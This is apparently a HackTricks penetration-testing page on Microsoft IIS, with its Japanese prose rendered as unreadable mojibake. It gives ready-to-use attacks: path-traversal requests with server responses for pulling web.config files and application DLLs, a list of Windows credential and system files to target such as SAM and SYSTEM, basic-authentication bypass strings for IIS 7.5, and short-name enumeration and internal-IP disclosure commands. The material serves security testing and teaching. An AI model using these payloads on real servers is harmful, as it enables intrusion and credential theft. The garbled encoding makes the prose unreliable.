# IIS - ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã‚¤ãƒ³ãƒ•ã‚©ãƒ¡ãƒ¼ã‚·ãƒ§ãƒ³ã‚µãƒ¼ãƒ“ã‚¹

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ãƒã‚§ãƒƒã‚¯ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã€‚

</details>

å®Ÿè¡Œå¯èƒ½ãªãƒ•ã‚¡ã‚¤ãƒ«æ‹¡å¼µå­ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹:

* asp
* aspx
* config
* php

## å†…éƒ¨IPã‚¢ãƒ‰ãƒ¬ã‚¹ã®æ¼æ´©

302å¿œç­”ã‚’è¿”ã™ä»»æ„ã®IISã‚µãƒ¼ãƒãƒ¼ã§ã€Hostãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å‰Šé™¤ã—ã€HTTP/1.0ã‚’ä½¿ç”¨ã—ã¦è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚å¿œç­”å†…ã®Locationãƒ˜ãƒƒãƒ€ãƒ¼ãŒå†…éƒ¨IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
å†…éƒ¨IPã‚’é–‹ç¤ºã™ã‚‹ãƒ¬ã‚¹ãƒãƒ³ã‚¹ï¼š
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .configãƒ•ã‚¡ã‚¤ãƒ«ã®å®Ÿè¡Œ

.configãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¸€ã¤ã®æ–¹æ³•ã¯ã€HTMLã‚³ãƒ¡ãƒ³ãƒˆå†…ã«ã‚³ãƒ¼ãƒ‰ã‚’ãƒ•ã‚¡ã‚¤ãƒ«ã®æœ€å¾Œã«è¿½åŠ ã™ã‚‹ã“ã¨ã§ã™ï¼š[ã“ã¡ã‚‰ã‹ã‚‰ä¾‹ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

ã“ã®è„†å¼±æ€§ã‚’åˆ©ç”¨ã™ã‚‹ãŸã‚ã®ã•ã‚‰ãªã‚‹æƒ…å ±ã¨ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯[ã“ã¡ã‚‰](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS Discovery Bruteforce

ç§ãŒä½œæˆã—ãŸãƒªã‚¹ãƒˆã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦ãã ã•ã„ï¼š

{% file src="../../.gitbook/assets/iisfinal.txt" %}

ä»¥ä¸‹ã®ãƒªã‚¹ãƒˆã®å†…å®¹ã‚’çµ±åˆã—ã¦ä½œæˆã•ã‚Œã¾ã—ãŸï¼š

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

æ‹¡å¼µå­ã‚’è¿½åŠ ã›ãšã«ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚å¿…è¦ãªãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯æ—¢ã«æ‹¡å¼µå­ãŒä»˜ã„ã¦ã„ã¾ã™ã€‚

## ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«

### ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®æ¼æ´©

{% hint style="info" %}
è¦ç´„ã™ã‚‹ã¨ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ•ã‚©ãƒ«ãƒ€å†…ã«ã¯ "**assemblyIdentity**" ãƒ•ã‚¡ã‚¤ãƒ«ã¨ "**namespaces**" ã¸ã®å‚ç…§ã‚’å«ã‚€è¤‡æ•°ã®web.configãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®æƒ…å ±ã‚’ã‚‚ã¨ã«ã€**å®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ã®å ´æ‰€**ã‚’çŸ¥ã‚Šã€ãã‚Œã‚‰ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚\
**ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸDllã‹ã‚‰**ã€ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦web.configãƒ•ã‚¡ã‚¤ãƒ«ã‚’å–å¾—ã—ã€æ–°ã—ã„namespacesã¨assemblyIdentityã‚’è¦‹ã¤ã‘ã‚‹ã¹ã**æ–°ã—ã„namespaces**ã‚‚è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã¾ãŸã€**connectionstrings.config** ã¨ **global.asax** ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯èˆˆå‘³æ·±ã„æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
å‚ç…§ï¼š[https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)
{% endhint %}

ã©ã® .Net ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚‚ã€MVCã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã¯ "**assemblyIdentity**" XMLã‚¿ã‚°ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒä½¿ç”¨ã™ã‚‹ã™ã¹ã¦ã®ãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«ã‚’è­˜åˆ¥ã™ã‚‹**web.config** ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚Šã¾ã™ã€‚
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
[...]

HTTP/1.1 200 OK
[...]
<?xml version="1.0" encoding="utf-8"?>
<configuration>
<configSections>
<section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral" requirePermission="false" />
</configSections>
<appSettings>
<add key="webpages:Version" value="3.0.0.0" />
<add key="webpages:Enabled" value="false" />
<add key="ClientValidationEnabled" value="true" />
<add key="UnobtrusiveJavaScriptEnabled" value="true" />
</appSettings>
<system.web>
<authentication mode="None" />
<compilation debug="true" targetFramework="4.6.1" />
<httpRuntime targetFramework="4.6.1" />
</system.web>
<system.webServer>
<modules>
<remove name="FormsAuthentication" />
</modules>
</system.webServer>
<runtime>
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<dependentAssembly>
<assemblyIdentity name="Microsoft.Owin.Security" />
<bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="Microsoft.Owin.Security.OAuth" />
<bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="Microsoft.Owin.Security.Cookies" />
<bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="Microsoft.Owin" />
<bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="Newtonsoft.Json" culture="neutral" />
<bindingRedirect oldVersion="0.0.0.0-6.0.0.0" newVersion="6.0.0.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="System.Web.Optimization" />
<bindingRedirect oldVersion="1.0.0.0-1.1.0.0" newVersion="1.1.0.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="WebGrease" />
<bindingRedirect oldVersion="0.0.0.0-1.5.2.14234" newVersion="1.5.2.14234" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="System.Web.Helpers" />
<bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="System.Web.Mvc" />
<bindingRedirect oldVersion="1.0.0.0-5.2.3.0" newVersion="5.2.3.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="System.Web.WebPages" />
<bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
</dependentAssembly>
</assemblyBinding>
```
å‰ã®å‡ºåŠ›ã§ã„ãã¤ã‹ã®"**assemblyIdentity**"ã¸ã®å‚ç…§ãŒè¦‹ã‚‰ã‚Œã¾ã™ã€‚ã“ã‚Œã‚‰ã¯/binãƒ•ã‚©ãƒ«ãƒ€å†…ã«å­˜åœ¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã§ã™ã€‚ä¾‹ãˆã°ï¼š **/bin/WebGrease.dll.**

.Netã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«è¦‹ã¤ã‹ã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ä»–ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ **/global.asax**ã§ã™ã€‚
```markup
<%@ Application Codebehind="Global.asax.cs" Inherits="WebApplication1.MvcApplication" Language="C#" %>
```
```markdown
ãã—ã¦ **/connectionstrings.config**

**æ³¨: ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ï¼**
```
```markup
<connectionStrings>
<add name="DefaultConnection" connectionString="Data Source=(LocalDb)\MSSQLLocalDB;AttachDbFilename [...]" providerName="System.Data.SqlClient" />
</connectionStrings>
```
**ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹**

ã•ã‚‰ã«ã€.Net MVCã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€é–‹ç™ºè€…ãŒã™ã¹ã¦ã®ãƒ•ã‚¡ã‚¤ãƒ«ã§ã€Œ@usingã€ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã‚’å®£è¨€ã™ã‚‹æ‰‹é–“ã‚’çœããŸã‚ã«ã€ç‰¹å®šã®ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã‚’å„ã‚»ãƒƒãƒˆã®ãƒ“ãƒ¥ãƒ¼ãƒšãƒ¼ã‚¸ã«å«ã‚ã‚‹ã“ã¨ã‚’ç›®çš„ã¨ã—ã¦ã€**ä»–ã®web.configãƒ•ã‚¡ã‚¤ãƒ«**ã‚’å®šç¾©ã™ã‚‹ã‚ˆã†ã«æ§‹é€ åŒ–ã•ã‚Œã¦ã„ã¾ã™ã€‚
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
[...]

HTTP/1.1 200 OK
[...]
<?xml version="1.0"?>
<configuration>
<configSections>
<sectionGroup name="system.web.webPages.razor" type="System.Web.WebPages.Razor.Configuration.RazorWebSectionGroup, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral">
<section name="host" type="System.Web.WebPages.Razor.Configuration.HostSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral" requirePermission="false" />
<section name="pages" type="System.Web.WebPages.Razor.Configuration.RazorPagesSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral" requirePermission="false" />
</sectionGroup>
</configSections>
<system.web.webPages.razor><host factoryType="System.Web.Mvc.MvcWebRazorHostFactory, System.Web.Mvc, Version=5.2.3.0, Culture=neutral" /><pages pageBaseType="System.Web.Mvc.WebViewPage">
<namespaces>
<add namespace="System.Web.Mvc" />
<add namespace="System.Web.Mvc.Ajax" />
<add namespace="System.Web.Mvc.Html" />
<add namespace="System.Web.Optimization"/>
<add namespace="System.Web.Routing" />
<add namespace="WebApplication1" />
```
**DLLã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**

ä»¥å‰ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‹ã‚‰ã€**ã‚«ã‚¹ã‚¿ãƒ ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹**ã®å®£è¨€ï¼ˆä»–ã®ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã™ï¼‰ã¯ã€/binãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«"**WebApplication1**"ã¨ã„ã†DLLãŒå­˜åœ¨ã™ã‚‹ã“ã¨ã‚’ç¤ºå”†ã—ã¦ã„ã¾ã™ã€‚
```
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
[...]
```
å‰ã®å‡ºåŠ›ã‹ã‚‰ã€/bin ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå†…ã«ã‚‚ä»¥ä¸‹ã® Dlls ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

* System.Web.Mvc.dll
* System.Web.Mvc.Ajax.dll
* System.Web.Mvc.Html.dll
* System.Web.Optimization.dll
* System.Web.Routing.dll

å‰è¿°ã® DLL ãŒ **WebApplication1.Areas.Minded.** ã¨ã„ã†åå‰ç©ºé–“ã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ã¦ã„ã‚‹ã¨ä»®å®šã™ã‚‹ã¨ã€æ”»æ’ƒè€…ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã«ä»–ã® web.config ãƒ•ã‚¡ã‚¤ãƒ«ãŒ **/area-name/Views/** ã¨ã„ã£ãŸæ¨æ¸¬å¯èƒ½/ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ‘ã‚¹ã«å­˜åœ¨ã—ã€/bin ãƒ•ã‚©ãƒ«ãƒ€å†…ã®ä»–ã® DLL ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å‚ç…§ã™ã‚‹ç‰¹å®šã®è¨­å®šãŒå«ã¾ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã¨æ¨æ¸¬ã§ãã¾ã™ã€‚
```markup
GET /download_page?id=..%2f..%2fMinded/Views/web.config HTTP/1.1
Host: example-mvc-application.minded
[...]

HTTP/1.1 200 OK
[...]
<?xml version="1.0"?>
<configuration>
<configSections>
<sectionGroup name="system.web.webPages.razor" type="System.Web.WebPages.Razor.Configuration.RazorWebSectionGroup, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral">
<section name="host" type="System.Web.WebPages.Razor.Configuration.HostSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral" requirePermission="false" />
<section name="pages" type="System.Web.WebPages.Razor.Configuration.RazorPagesSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutralâ€ requirePermission="false" />
</sectionGroup>
</configSections>
<system.web.webPages.razor><host factoryType="System.Web.Mvc.MvcWebRazorHostFactory, System.Web.Mvc, Version=5.2.3.0, Culture=neutral" />
<pages pageBaseType="System.Web.Mvc.WebViewPage">
<namespaces>
<add namespace="System.Web.Mvc" />
<add namespace="System.Web.Mvc.Ajax" />
<add namespace="System.Web.Mvc.Html" />
<add namespace="System.Web.Routing" />
<add namespace="System.Web.Optimization" />
<add namespace="WebApplication1" />
<add namespace="WebApplication1.AdditionalFeatures" />
</namespaces>
```
å‰ã®å‡ºåŠ›ã§ã€æ–°ã—ã„åå‰ç©ºé–“ **WebApplication1.AdditionalFeatures** ãŒè¦‹ãˆã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯ã€/bin ãƒ•ã‚©ãƒ«ãƒ€ã« **WebApplication1.AdditionalFeatures.dll** ã¨ã„ã†åˆ¥ã®DllãŒã‚ã‚‹ã“ã¨ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

### å…±é€šãƒ•ã‚¡ã‚¤ãƒ«

[ã“ã¡ã‚‰](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)ã‹ã‚‰
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 ã‚¨ãƒ©ãƒ¼

æ¬¡ã®ã‚ˆã†ãªã‚¨ãƒ©ãƒ¼ãŒè¡¨ç¤ºã•ã‚ŒãŸå ´åˆï¼š

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (13).png>)

ã“ã‚Œã¯ã‚µãƒ¼ãƒãƒ¼ãŒãƒ›ã‚¹ãƒˆãƒ˜ãƒƒãƒ€ãƒ¼å†…ã§**æ­£ã—ã„ãƒ‰ãƒ¡ã‚¤ãƒ³åã‚’å—ä¿¡ã—ã¦ã„ãªã„**ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚\
Webãƒšãƒ¼ã‚¸ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã¯ã€æä¾›ã•ã‚Œã¦ã„ã‚‹**SSLè¨¼æ˜æ›¸**ã‚’ç¢ºèªã—ã€ãã“ã«ãƒ‰ãƒ¡ã‚¤ãƒ³/ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³åãŒè¦‹ã¤ã‹ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ãã“ã«ãªã„å ´åˆã¯ã€æ­£ã—ã„ã‚‚ã®ã‚’è¦‹ã¤ã‘ã‚‹ã¾ã§**VHostsã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

## å¤ã„IISã®è„†å¼±æ€§ã‚’æ¢ã™ä¾¡å€¤ãŒã‚ã‚‹

### Microsoft IIS ãƒãƒ«ãƒ€æ–‡å­— â€œ\~â€ è„†å¼±æ€§/æ©Ÿèƒ½ â€“ çŸ­ã„ãƒ•ã‚¡ã‚¤ãƒ«/ãƒ•ã‚©ãƒ«ãƒ€åã®é–‹ç¤º

ã“ã®**æŠ€è¡“**ã‚’ä½¿ç”¨ã—ã¦ã€ç™ºè¦‹ã•ã‚ŒãŸå„ãƒ•ã‚©ãƒ«ãƒ€å†…ã®**ãƒ•ã‚©ãƒ«ãƒ€ã¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚’åˆ—æŒ™**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆåŸºæœ¬èªè¨¼ãŒå¿…è¦ã§ã‚ã£ã¦ã‚‚ï¼‰ã€‚\
ã“ã®æŠ€è¡“ã®ä¸»ãªåˆ¶é™ã¯ã€ã‚µãƒ¼ãƒãƒ¼ãŒè„†å¼±ã§ã‚ã‚‹å ´åˆã€**å„ãƒ•ã‚¡ã‚¤ãƒ«/ãƒ•ã‚©ãƒ«ãƒ€ã®åå‰ã®æœ€åˆã®6æ–‡å­—ã¨ãƒ•ã‚¡ã‚¤ãƒ«ã®æ‹¡å¼µå­ã®æœ€åˆã®3æ–‡å­—ã¾ã§ã—ã‹è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ããªã„**ã“ã¨ã§ã™ã€‚

ã“ã®è„†å¼±æ€§ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ã«ã¯[https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (183).png>)

ã‚ªãƒªã‚¸ãƒŠãƒ«ã®ç ”ç©¶ï¼š[https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

ã¾ãŸã€**metasploit**ã‚‚ä½¿ç”¨ã§ãã¾ã™ï¼š`use scanner/http/iis_shortname_scanner`

### åŸºæœ¬èªè¨¼ã®ãƒã‚¤ãƒ‘ã‚¹

åŸºæœ¬èªè¨¼ï¼ˆ**IIS 7.5**ï¼‰ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚ˆã†ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ï¼š`/admin:$i30:$INDEX_ALLOCATION/admin.php` ã¾ãŸã¯ `/admin::$INDEX_ALLOCATION/admin.php`

ã“ã®**è„†å¼±æ€§**ã¨å‰è¿°ã®ã‚‚ã®ã‚’**çµ„ã¿åˆã‚ã›ã¦**ã€æ–°ã—ã„**ãƒ•ã‚©ãƒ«ãƒ€**ã‚’è¦‹ã¤ã‘ã¦èªè¨¼ã‚’**ãƒã‚¤ãƒ‘ã‚¹**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## ASP.NET Trace.AXD ãŒæœ‰åŠ¹ãªãƒ‡ãƒãƒƒã‚°

ASP.NETã«ã¯ãƒ‡ãƒãƒƒã‚°ãƒ¢ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ `trace.axd` ã¨å‘¼ã°ã‚Œã¾ã™ã€‚

